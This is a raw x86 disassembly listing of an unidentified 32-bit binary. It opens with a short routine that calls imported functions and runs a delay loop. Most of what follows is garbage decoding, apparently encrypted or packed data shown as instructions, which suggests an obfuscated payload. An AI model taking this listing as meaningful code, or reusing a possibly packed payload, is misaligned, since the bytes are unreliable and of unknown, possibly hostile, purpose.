  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0x20b374b
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	popf   
  4169ce:	ret    
  4169cf:	mov    edi,?
  4169d1:	cmp    DWORD PTR [esi-0x1d5b39fd],esp
  4169d7:	or     DWORD PTR ds:0x1c992fa0,ebx
  4169dd:	inc    edi
  4169de:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  4169e4:	or     DWORD PTR [ebp+0x5f],ebx
  4169e7:	rcr    BYTE PTR [ecx-0x59c500e4],1
  4169ed:	add    eax,esi
  4169ef:	mov    al,ds:0x5f1d09e2
  4169f4:	rcr    BYTE PTR [ecx-0x59c500e4],1
  4169fa:	add    eax,esi
  4169fc:	mov    al,ds:0x5f1d09e2
  416a01:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416a07:	add    eax,esi
  416a09:	test   al,0xe3
  416a0b:	or     DWORD PTR ds:0x1223cf51,ebx
  416a11:	dec    DWORD PTR [esi+0x18e7ceaf]
  416a17:	jecxz  0x416a5e
  416a19:	sar    BYTE PTR [esi-0x7c],1
  416a1c:	icebp  
  416a1d:	jne    0x4169ab
  416a1f:	sbb    dl,dh
  416a21:	jno    0x4169cc
  416a23:	(bad)  
  416a24:	nop
  416a25:	push   0xf8b37f70
  416a2a:	jb     0x4169bd
  416a2c:	push   ebp
  416a2d:	shl    BYTE PTR [ebx],cl
  416a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a30:	(bad)
  416a33:	push   0x72f0f031
  416a38:	fistp  QWORD PTR [esi-0x17]
  416a3b:	push   eax
  416a3c:	out    0xcd,al
  416a3e:	lea    ebp,[ebp+0x78]
  416a41:	jno    0x416a20
  416a43:	xchg   esp,eax
  416a44:	push   ss
  416a45:	fstp   TBYTE PTR [edx]
  416a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a48:	add    eax,esi
  416a4a:	mov    al,ds:0x906709e2
  416a4f:	(bad)  
  416a50:	pop    ss
  416a51:	and    dl,BYTE PTR [ecx+0x42]
  416a54:	jnp    0x416a93
  416a56:	push   0xb3373fd8
  416a5b:	daa    
  416a5c:	or     eax,0xe7192fbc
  416a61:	test   BYTE PTR [ebp+0x3ac77dbe],ch
  416a67:	iret   
  416a68:	sub    BYTE PTR [edi+0x37],0x64
  416a6c:	and    bl,BYTE PTR [edi]
  416a6e:	xchg   ebp,eax
  416a6f:	rcr    BYTE PTR [ebx],1
  416a71:	mov    ch,0x4c
  416a73:	jno    0x416a35
  416a75:	push   cs
  416a76:	or     BYTE PTR [edx-0x3f],cl
  416a79:	les    edx,FWORD PTR [esi+ebx*8+0x1976f1de]
  416a80:	aam    0x2a
  416a82:	icebp  
  416a83:	test   al,0x44
  416a85:	sub    ebp,DWORD PTR [ecx]
  416a87:	sar    DWORD PTR [ebx+0x26],1
  416a8a:	push   0xb3373fd8
  416a8f:	es or  eax,0xe787b3d0
  416a95:	lea    ebp,fs:[ebp+edi*2-0x7d9a582e]
  416a9d:	cmc    
  416a9e:	stos   BYTE PTR es:[edi],al
  416a9f:	retf   
  416aa0:	and    al,BYTE PTR [ebx+0x8]
  416aa3:	jnp    0x416ac0
  416aa5:	test   ecx,edx
  416aa7:	jmp    0x416a69
  416aa9:	pusha  
  416aaa:	jle    0x416a8d
  416aac:	rcr    edx,0x9
  416aaf:	inc    ebx
  416ab0:	fdivp  st(1),st
  416ab2:	push   cs
  416ab3:	call   0x22f1:0xb3364fd4
  416aba:	push   ecx
  416abb:	inc    edx
  416abc:	jnp    0x416ac1
  416abe:	(bad)  
  416abf:	mov    al,ds:0x5f1d09e2
  416ac4:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416aca:	add    eax,esi
  416acc:	mov    al,ds:0x5f1d09e2
  416ad1:	rcr    BYTE PTR [ecx-0x1c9500e4],1
  416ad7:	add    eax,esi
  416ad9:	in     al,dx
  416ada:	jecxz  0x416ae6
  416adc:	sbb    eax,0x53d49e39
  416ae1:	(bad)  
  416ae2:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416ae8:	or     ebp,edi
  416aea:	pop    edi
  416aeb:	rcr    BYTE PTR [eax-0x59cf01e9],cl
  416af1:	add    esp,DWORD PTR [esp+eiz*4]
  416af4:	loop   0x416aff
  416af6:	cdq    
  416af7:	pop    ecx
  416af8:	rcr    BYTE PTR [ecx-0x1ac500e4],1
  416afe:	mov    esi,0x19e2a0c6
  416b03:	sbb    eax,0x1999d05f
  416b08:	(bad)  
  416b09:	cmp    ah,BYTE PTR [esi-0xd5f39bd]
  416b0f:	or     DWORD PTR ds:0x1c99d25f,ebx
  416b15:	cli    
  416b16:	cmp    ah,BYTE PTR [edi-0x1d5f39fd]
  416b1c:	or     DWORD PTR [eax],ebx
  416b1e:	pop    edi
  416b1f:	rcr    DWORD PTR [ecx-0x59c500e4],1
  416b25:	add    esi,esi
  416b27:	lods   al,BYTE PTR ds:[esi]
  416b28:	loop   0x416b33
  416b2a:	sbb    DWORD PTR [edi-0x30],ebx
  416b2d:	xchg   ebx,eax
  416b2e:	loop   0x416b2b
  416b30:	cmp    ah,BYTE PTR [ebx+eax*1+0x9e22186]
  416b37:	or     eax,0x1c89d05f
  416b3c:	(bad)  
  416b3d:	cmp    ah,BYTE PTR [esi-0xd5f39ed]
  416b43:	or     DWORD PTR ds:0x1c99d05f,ebx
  416b49:	out    dx,eax
  416b4a:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416b50:	or     DWORD PTR ds:0x1899d05f,ebx
  416b56:	push   DWORD PTR [esi]
  416b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b59:	pop    edx
  416b5a:	lds    esp,FWORD PTR [eax+0x54dd09e2]
  416b60:	ror    ah,1
  416b62:	and    edi,edi
  416b64:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416b6a:	or     DWORD PTR ds:0x1c99d05f,ebx
  416b70:	(bad)  
  416b71:	cmp    ah,BYTE PTR [esi-0x3d5f39fd]
  416b77:	add    eax,0x99d0471d
  416b7c:	sbb    al,0xff
  416b7e:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416b84:	or     DWORD PTR ds:0x1c99d05f,ebx
  416b8a:	(bad)  
  416b8b:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416b91:	or     DWORD PTR ds:0x1c99d05f,ebx
  416b97:	(bad)  
  416b98:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416b9e:	or     DWORD PTR ds:0x1c99d05f,ebx
  416ba4:	(bad)  
  416ba5:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416bab:	or     DWORD PTR ds:0x1c99d05f,ebx
  416bb1:	(bad)  
  416bb2:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416bb8:	or     DWORD PTR ds:0x1c99d05f,ebx
  416bbe:	(bad)  
  416bbf:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416bc5:	or     DWORD PTR ds:0x1c99d05f,ebx
  416bcb:	(bad)  
  416bcc:	cmp    cl,BYTE PTR [eax-0x69275c89]
  416bd2:	or     DWORD PTR ds:0x1729d05f,ebx
  416bd8:	(bad)  
  416bd9:	cmp    dh,BYTE PTR [esi-0x7b5f39fd]
  416bdf:	or     eax,0x99d45f1d
  416be4:	sbb    al,0xaf
  416be6:	jg     0x416bcd
  416be8:	xor    DWORD PTR [edx+0x1d09e2ef],edx
  416bee:	pop    edi
  416bef:	rcr    BYTE PTR [ecx+0x463aff3c],1
  416bf5:	sub    eax,0x6a90d3b4
  416bfa:	sbb    eax,0x7c99d05f
  416bff:	(bad)  
  416c00:	cmp    ah,BYTE PTR [esi-0x1d5f323d]
  416c06:	pop    ebx
  416c07:	sbb    eax,0x18f3d05f
  416c0c:	(bad)  
  416c0d:	cmp    ah,BYTE PTR [esi-0x1d5f39fd]
  416c13:	or     DWORD PTR ds:0x1c99d05f,ebx
  416c19:	fistp  QWORD PTR [edx]
  416c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c1c:	jecxz  0x416c06
  416c1e:	rol    BYTE PTR [edi-0x2fc38d9b],cl
  416c24:	cdq    
  416c25:	sbb    al,0xfd
  416c27:	cmp    ah,BYTE PTR [esi-0x1d5319fd]
  416c2d:	or     DWORD PTR [edi],ebx
  416c2f:	pop    edi
  416c30:	rcr    BYTE PTR [ecx-0x59c50460],1
  416c36:	add    eax,esi
  416c38:	mov    al,ds:0x5f1d09e2
  416c3d:	rcr    BYTE PTR [ecx-0x598500e4],1
  416c43:	add    eax,DWORD PTR [esi]
  416c45:	mov    al,ds:0x5f1d09e2
  416c4a:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c50:	add    eax,esi
  416c52:	mov    al,ds:0x5f1d09e2
  416c57:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c5d:	add    eax,esi
  416c5f:	mov    al,ds:0x5f1d09e2
  416c64:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c6a:	add    eax,esi
  416c6c:	mov    al,ds:0x5f1d09e2
  416c71:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c77:	add    eax,esi
  416c79:	mov    al,ds:0x5f1d09e2
  416c7e:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c84:	add    eax,esi
  416c86:	mov    al,ds:0x5f1d09e2
  416c8b:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c91:	add    eax,esi
  416c93:	mov    al,ds:0x5f1d09e2
  416c98:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416c9e:	add    eax,esi
  416ca0:	mov    al,ds:0x5f1d09e2
  416ca5:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cab:	add    eax,esi
  416cad:	mov    al,ds:0x5f1d09e2
  416cb2:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cb8:	add    eax,esi
  416cba:	mov    al,ds:0x5f1d09e2
  416cbf:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cc5:	add    eax,esi
  416cc7:	mov    al,ds:0x5f1d09e2
  416ccc:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cd2:	add    eax,esi
  416cd4:	mov    al,ds:0x5f1d09e2
  416cd9:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cdf:	add    eax,esi
  416ce1:	mov    al,ds:0x5f1d09e2
  416ce6:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cec:	add    eax,esi
  416cee:	mov    al,ds:0x5f1d09e2
  416cf3:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416cf9:	add    eax,esi
  416cfb:	mov    al,ds:0x5f1d09e2
  416d00:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d06:	add    eax,esi
  416d08:	mov    al,ds:0x5f1d09e2
  416d0d:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d13:	add    eax,esi
  416d15:	mov    al,ds:0x5f1d09e2
  416d1a:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d20:	add    eax,esi
  416d22:	mov    al,ds:0x5f1d09e2
  416d27:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d2d:	add    eax,esi
  416d2f:	mov    al,ds:0x5f1d09e2
  416d34:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d3a:	add    eax,esi
  416d3c:	mov    al,ds:0x5f1d09e2
  416d41:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d47:	add    eax,esi
  416d49:	mov    al,ds:0x5f1d09e2
  416d4e:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d54:	add    eax,esi
  416d56:	mov    al,ds:0x5f1d09e2
  416d5b:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d61:	add    eax,esi
  416d63:	mov    al,ds:0x5f1d09e2
  416d68:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d6e:	add    eax,esi
  416d70:	mov    al,ds:0x5f1d09e2
  416d75:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d7b:	add    eax,esi
  416d7d:	mov    al,ds:0x5f1d09e2
  416d82:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d88:	add    eax,esi
  416d8a:	mov    al,ds:0x5f1d09e2
  416d8f:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416d95:	add    eax,esi
  416d97:	mov    al,ds:0x5f1d09e2
  416d9c:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416da2:	add    eax,esi
  416da4:	mov    al,ds:0x5f1d09e2
  416da9:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416daf:	add    eax,esi
  416db1:	mov    al,ds:0x5f1d09e2
  416db6:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416dbc:	add    eax,esi
  416dbe:	mov    al,ds:0x5f1d09e2
  416dc3:	rcr    BYTE PTR [ecx-0x59c500e4],1
  416dc9:	add    eax,esi
  416dcb:	mov    al,ds:0x5453a2e2
  416dd0:	shl    BYTE PTR [esi-0x59d500e4],1
  416dd6:	add    ebp,esp
  416dd8:	add    bh,BYTE PTR [eax]
  416dda:	jge    0x416d7c
  416ddc:	adc    bl,ah
  416dde:	mov    esi,DWORD PTR [edi]
  416de0:	les    eax,FWORD PTR [edi]
  416de2:	dec    ecx
  416de3:	mov    dh,0x54
  416de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416de6:	stos   DWORD PTR es:[edi],eax
  416de7:	push   eax
  416de8:	in     al,dx
  416de9:	and    DWORD PTR [ebx-0x76],0x5b
  416ded:	(bad)  
  416dee:	sar    DWORD PTR [esi-0x78],cl
  416df1:	test   cl,dl
  416df3:	and    bl,dh
  416df5:	push   edx
  416df6:	enter  0x468e,0xc8
  416dfa:	mov    edi,0x7de0cb59
  416dff:	jno    0x416dc8
  416e01:	dec    edx
  416e02:	adc    al,0xd7
  416e04:	push   eax
  416e05:	mov    fs,ecx
  416e07:	fild   WORD PTR [ebx]
  416e09:	sahf   
  416e0a:	inc    eax
  416e0b:	(bad)  
  416e0c:	in     al,dx
  416e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0e:	rol    DWORD PTR [ecx-0x50586078],1
  416e14:	or     esi,ecx
  416e16:	mov    edi,0xb0518814
  416e1b:	cmp    WORD PTR [eax+0x55ec06c0],0xb00
  416e24:	xchg   BYTE PTR [ebp-0x419b7a4],cl
  416e2a:	jle    0x416e73
  416e2c:	inc    ebp
  416e2d:	std    
  416e2e:	fs sbb eax,0xe0c236f4
  416e34:	pop    ss
  416e35:	das    
  416e36:	jns    0x416e1a
  416e38:	aas    
  416e39:	in     al,0x24
  416e3b:	stos   BYTE PTR es:[edi],al
  416e3c:	lea    edx,[edx+0x7f]
  416e3f:	xchg   edi,eax
  416e40:	mov    eax,0xfd781cfa
  416e45:	pop    edx
  416e46:	mov    ebp,0x3dde6d3f
  416e4b:	popa   
  416e4c:	mov    ebp,0x399e01b9
  416e51:	or     al,BYTE PTR [eax+0x32]
  416e54:	out    dx,al
  416e55:	bound  ecx,QWORD PTR [eax-0x40]
  416e58:	and    eax,0x9c663e90
  416e5d:	pop    edx
  416e5e:	(bad)  
  416e5f:	sub    DWORD PTR [ebp-0x2f5f20dd],ebp
  416e65:	das    
  416e66:	aad    0x53
  416e68:	xor    eax,0x9645333c
  416e6d:	mov    ebx,0x6ff0a7e7
  416e72:	int3   
  416e73:	xor    eax,0xc8e52c0a
  416e78:	imul   ecx,DWORD PTR [ebp+ebp*8+0x6207e2dd],0x28
  416e80:	outs   dx,DWORD PTR ds:[esi]
  416e81:	enter  0xe156,0x90
  416e85:	xlat   BYTE PTR ds:[ebx]
  416e86:	adc    eax,0xa933f4e
  416e8b:	add    DWORD PTR [ebx-0x65fafc61],ebp
  416e91:	lock out dx,eax
  416e93:	(bad)
  416e97:	out    0xe,eax
  416e99:	fidiv  DWORD PTR [ecx-0x734c4d97]
  416e9f:	pop    esi
  416ea0:	sbb    dl,bh
  416ea2:	mov    esp,0xf1cd377b
  416ea7:	ret    
  416ea8:	or     BYTE PTR [ebp-0x184b7803],0xfa
  416eaf:	lds    edi,FWORD PTR [esi+0xaeb2ed3]
  416eb5:	or     al,0xfd
  416eb7:	mov    DWORD PTR [ebx-0x654ec939],edx
  416ebd:	and    eax,DWORD PTR [edi]
  416ebf:	loopne 0x416f33
  416ec1:	or     BYTE PTR [edx],bl
  416ec3:	inc    ebp
  416ec4:	bound  esi,QWORD PTR [ecx-0x3c4bc96b]
  416eca:	iret   
  416ecb:	out    dx,al
  416ecc:	add    edi,0x6a
  416ecf:	dec    esi
  416ed0:	js     0x416ec9
  416ed2:	repnz push 0x7f
  416ed5:	mov    bl,BYTE PTR ds:0xa6663815
  416edb:	js     0x416f3f
  416edd:	pop    es
  416ede:	test   eax,0x55fa951d
  416ee3:	xadd   DWORD PTR [ebp-0x11],ecx
  416ee7:	fldcw  WORD PTR [ebp-0x13]
  416eea:	aad    0x64
  416eec:	mov    ds:0x894703e1,al
  416ef1:	sub    bl,BYTE PTR [edx-0x59]
  416ef4:	cli    
  416ef5:	dec    edi
  416ef6:	popa   
  416ef7:	and    bh,BYTE PTR [ecx-0x263058c]
  416efd:	(bad)  
  416efe:	mov    eax,0x3055aee7
  416f03:	ret    0x7ae4
  416f06:	ror    edi,0x94
  416f09:	jp     0x416ef9
  416f0b:	push   cs
  416f0c:	(bad)  
  416f0d:	bnd jne 0x416f1b
  416f10:	sbb    al,0x53
  416f12:	fldcw  WORD PTR [edx+0x4f]
  416f15:	(bad)  
  416f16:	adc    al,0xcf
  416f18:	inc    edi
  416f19:	ficom  DWORD PTR [edx+0x20e48d9e]
  416f1f:	loop   0x416ed4
  416f21:	sub    BYTE PTR [ebp-0x3580085],ah
  416f27:	js     0x416f84
  416f29:	jmp    0x6878db5b
  416f2e:	repnz or BYTE PTR [ecx],al
  416f31:	xchg   BYTE PTR [ebx-0x4d10bf82],ch
  416f37:	das    
  416f38:	ins    BYTE PTR es:[edi],dx
  416f39:	cs jne 0x416f52
  416f3c:	dec    ebx
  416f3d:	dec    ecx
  416f3e:	xchg   edi,eax
  416f3f:	mov    al,0xc2
  416f41:	adc    BYTE PTR [ebx-0x5],bh
  416f44:	lahf   
  416f45:	mov    eax,0x3838bdd9
  416f4a:	ja     0x416f9a
  416f4c:	cmp    BYTE PTR [eax+ecx*2],0x52
  416f50:	mov    dl,0x42
  416f52:	xor    dl,BYTE PTR [edx+0x744d4bc0]
  416f58:	out    dx,al
  416f59:	push   ecx
  416f5a:	jne    0x416fb7
  416f5c:	jne    0x416f69
  416f5e:	push   ebx
  416f5f:	mov    dl,0x39
  416f61:	les    edi,FWORD PTR [ebx+0x66f0b61b]
  416f67:	lds    eax,FWORD PTR [eax+0x78]
  416f6a:	adc    bl,BYTE PTR [eax]
  416f6c:	loope  0x416fb9
  416f6e:	xlat   BYTE PTR ds:[ebx]
  416f6f:	and    DWORD PTR [ecx],eax
  416f71:	rcr    bh,1
  416f73:	jnp    0x416f72
  416f75:	xor    al,0xce
  416f77:	inc    ecx
  416f78:	and    al,0xfb
  416f7a:	push   ebp
  416f7b:	jns    0x416f72
  416f7d:	mov    ah,0x68
  416f7f:	mov    ah,0x4d
  416f81:	stc    
  416f82:	fadd   DWORD PTR [eax+0x54604a38]
  416f88:	jecxz  0x416f83
  416f8a:	sar    BYTE PTR ds:0xa61a8a44,cl
  416f90:	(bad)  
  416f91:	sub    al,0xf7
  416f93:	test   DWORD PTR [edx],edx
  416f95:	add    ebp,DWORD PTR [ecx]
  416f97:	fs (bad) 
  416f99:	data16 mov ds:0x7a2a7896,al
  416f9f:	ja     0x416f84
  416fa1:	xor    bl,cl
  416fa3:	mov    cl,0x90
  416fa5:	xor    BYTE PTR [ebx-0x15],0xee
  416fa9:	pop    eax
  416faa:	das    
  416fab:	nop
  416fac:	pop    esi
  416fad:	aad    0x7
  416faf:	adc    eax,0x38e14ac1
  416fb4:	jg     0x416fee
  416fb6:	mov    eax,0xf72410cd
  416fbb:	fadd   QWORD PTR [esi-0xb]
  416fbe:	out    0x8b,eax
  416fc0:	sar    eax,cl
  416fc2:	inc    eax
  416fc3:	dec    esp
  416fc4:	add    eax,DWORD PTR [ebx]
  416fc6:	mov    WORD PTR [edi-0x7c87fc56],?
  416fcc:	push   cs
  416fcd:	pusha  
  416fce:	das    
  416fcf:	add    cl,bl
  416fd1:	(bad)  
  416fd2:	xor    al,0x43
  416fd4:	push   ecx
  416fd5:	pushf  
  416fd6:	fdivr  DWORD PTR [esi-0x7d]
  416fd9:	imul   eax,esi,0x6347d774
  416fdf:	cmp    DWORD PTR [esi+0x3d],esi
  416fe2:	or     al,0xa1
  416fe4:	or     al,0x68
  416fe6:	in     al,0x97
  416fe8:	popf   
  416fe9:	add    BYTE PTR [edx+0x57357c0a],dl
  416fef:	ficom  DWORD PTR [edi+0x714e095a]
  416ff5:	in     al,0x61
  416ff7:	dec    esp
  416ff8:	or     al,0x22
  416ffa:	jecxz  0x417059
  416ffc:	sub    al,0xc1
  416ffe:	mov    edi,0xbfd45a41
  417003:	jnp    0x41707a
  417005:	ret    
  417006:	mov    ch,0xfc
  417008:	push   ecx
  417009:	sbb    dh,BYTE PTR [ebp+eiz*8-0x21189a86]
  417010:	lods   al,BYTE PTR ds:[esi]
  417011:	js     0x417016
  417013:	mov    cl,0x23
  417015:	mov    BYTE PTR [eax],0xf4
  417018:	sbb    bh,bl
  41701a:	aas    
  41701b:	scas   eax,DWORD PTR es:[edi]
  41701c:	cmp    DWORD PTR [bp+di],0x8d6d5124
  417023:	mov    cl,0xee
  417025:	sub    al,0x35
  417027:	jo     0x417083
  417029:	(bad)
  41702d:	pop    ds
  41702e:	aam    0xd0
  417030:	retf   0x3f30
  417033:	sahf   
  417034:	mov    ah,0x8f
  417036:	add    al,dh
  417038:	pop    ds
  417039:	mov    edi,0x972114d3
  41703e:	les    ebp,FWORD PTR [ecx]
  417040:	shl    DWORD PTR fs:[esi-0x31],cl
  417044:	dec    eax
  417045:	jmp    0xdc6a:0x6715774b
  41704c:	jae    0x417060
  41704e:	or     BYTE PTR [edi-0x10],dh
  417051:	pop    edi
  417052:	pop    es
  417053:	data16 cmp ah,0xce
  417057:	dec    ecx
  417058:	push   0x3c
  41705a:	jmp    0x41707a
  41705c:	cmp    al,0x21
  41705e:	and    BYTE PTR [ebp+ebp*4-0x22],0x0
  417063:	mov    ds,ebp
  417065:	repz and al,0x12
  417068:	mov    dh,0x69
  41706a:	sub    ecx,esp
  41706c:	scas   al,BYTE PTR es:[edi]
  41706d:	pop    ecx
  41706e:	xor    ebp,DWORD PTR [ebx+0x4cf3f9d1]
  417074:	sbb    dh,BYTE PTR [edi+edx*1]
  417077:	(bad)  
  417078:	pop    edx
  417079:	or     al,0x3b
  41707b:	int3   
  41707c:	xchg   DWORD PTR ds:0x73d40c0d,eax
  417082:	ret    
  417083:	dec    edx
  417084:	inc    eax
  417085:	jl     0x4170bd
  417087:	and    eax,0xf17a6973
  41708c:	cmc    
  41708d:	xor    cl,BYTE PTR [ebp-0x3b]
  417090:	cmp    bh,BYTE PTR [ebp+eax*2-0x48eb968c]
  417097:	dec    edi
  417098:	retf   
  417099:	fs scas eax,DWORD PTR es:[edi]
  41709b:	add    BYTE PTR [edx],dh
  41709d:	xor    esi,ebp
  41709f:	dec    ebx
  4170a0:	push   edx
  4170a1:	ins    BYTE PTR es:[edi],dx
  4170a2:	inc    eax
  4170a3:	nop
  4170a4:	stc    
  4170a5:	jle    0x4170fc
  4170a7:	mov    dh,0xbd
  4170a9:	mov    eax,ds:0x4fcc07ec
  4170ae:	push   edi
  4170af:	sub    cl,al
  4170b1:	sbb    eax,0xf8f6fc69
  4170b6:	js     0x41705b
  4170b8:	aaa    
  4170b9:	xchg   BYTE PTR [edi+0x7e],dh
  4170bc:	xor    edi,eax
  4170be:	mov    esp,0x21cd626e
  4170c3:	xchg   esi,eax
  4170c4:	cdq    
  4170c5:	mov    dl,0x87
  4170c7:	xor    eax,0x1b69ebb4
  4170cc:	mov    al,0xa8
  4170ce:	mov    al,bh
  4170d0:	sbb    BYTE PTR [ebx+0x4f581df0],ch
  4170d6:	dec    edi
  4170d7:	inc    ebx
  4170d8:	int    0x48
  4170da:	sbb    al,0x27
  4170dc:	cmp    esp,edx
  4170de:	(bad)  
  4170e0:	scas   al,BYTE PTR es:[edi]
  4170e1:	pop    DWORD PTR [ecx+0x1b]
  4170e4:	mov    WORD PTR [ecx+0x22],gs
  4170e7:	jne    0x417079
  4170e9:	inc    eax
  4170ea:	mov    al,ds:0xcd6e11b1
  4170ef:	push   0xfffffff0
  4170f1:	push   eax
  4170f2:	sti    
  4170f3:	push   ecx
  4170f4:	push   edi
  4170f5:	sub    eax,0x84133cbf
  4170fa:	in     al,0x5f
  4170fc:	jmp    0x6226:0x8de9ae34
  417103:	pop    ebx
  417104:	in     al,dx
  417105:	int3   
  417106:	xchg   edi,eax
  417107:	sbb    al,0xf1
  417109:	jae    0x41711c
  41710b:	lock fisub DWORD PTR ds:0x529eeeaa
  417112:	ret    0x8a65
  417115:	call   0xfd771213
  41711a:	or     al,0x78
  41711c:	push   eax
  41711d:	dec    edi
  41711e:	pop    eax
  41711f:	xchg   DWORD PTR ds:0x5e0961dd,eax
  417125:	in     eax,0x51
  417127:	xchg   edi,eax
  417128:	div    BYTE PTR [ebx]
  41712a:	cmp    eax,0x5a8ea1d
  41712f:	sar    BYTE PTR [eax+0x4f],cl
  417132:	ja     0x417190
  417134:	mov    esp,0xfaf08ad7
  417139:	cld    
  41713a:	imul   ebp,DWORD PTR [edx+eiz*4-0x50954c9f],0xffffffe9
  417142:	mov    edi,0x82a116c4
  417147:	dec    ecx
  417148:	or     eax,0xee314cba
  41714d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41714e:	pop    ebp
  41714f:	inc    eax
  417150:	sbb    al,0x82
  417152:	inc    eax
  417153:	iret   
  417154:	or     bl,BYTE PTR [esi+0x3576198d]
  41715a:	(bad)  
  41715b:	xor    ebp,0x7d
  41715e:	sub    edi,DWORD PTR [edi]
  417160:	adc    ch,BYTE PTR [eax]
  417162:	in     al,dx
  417163:	out    dx,al
  417164:	adc    esi,DWORD PTR [ebx+0x4c]
  417167:	and    eax,0x45f5497d
  41716c:	rcr    BYTE PTR fs:[ebx+edx*4],0xb9
  417171:	sub    esi,DWORD PTR [ebp-0x71e4e34f]
  417177:	daa    
  417178:	(bad)  
  41717a:	sbb    DWORD PTR [ecx-0x28],0x2
  41717e:	push   eax
  41717f:	(bad)  [ebx+0xc]
  417182:	pop    ebx
  417183:	dec    esp
  417184:	or     eax,0xd89f44a4
  417189:	dec    esi
  41718a:	and    edi,DWORD PTR [eax]
  41718c:	frstor [eax+edi*1]
  41718f:	ret    
  417190:	hlt    
  417191:	lods   al,BYTE PTR ds:[esi]
  417192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417193:	sub    al,0xe1
  417195:	add    dl,bh
  417197:	sbb    edx,DWORD PTR [eax]
  417199:	push   esp
  41719a:	shr    DWORD PTR [edx],cl
  41719c:	stos   BYTE PTR es:[edi],al
  41719d:	leave  
  41719e:	shl    DWORD PTR [edi+ecx*1-0x31db2209],1
  4171a5:	mov    ecx,0x5a2b549d
  4171aa:	shl    eax,cl
  4171ac:	mov    edi,0x9d40b2d8
  4171b1:	lods   eax,DWORD PTR ds:[esi]
  4171b2:	cld    
  4171b3:	imul   esi,DWORD PTR [ebx-0x3a],0x3cdca681
  4171ba:	mov    al,0xb8
  4171bc:	aaa    
  4171bd:	addr16 mov eax,fs
  4171c0:	das    
  4171c1:	loope  0x4171de
  4171c3:	fsubr  st(4),st
  4171c5:	and    eax,0x133b9e1e
  4171ca:	ja     0x417222
  4171cc:	ret    0xf022
  4171cf:	iret   
  4171d0:	add    esi,ebp
  4171d2:	push   ebp
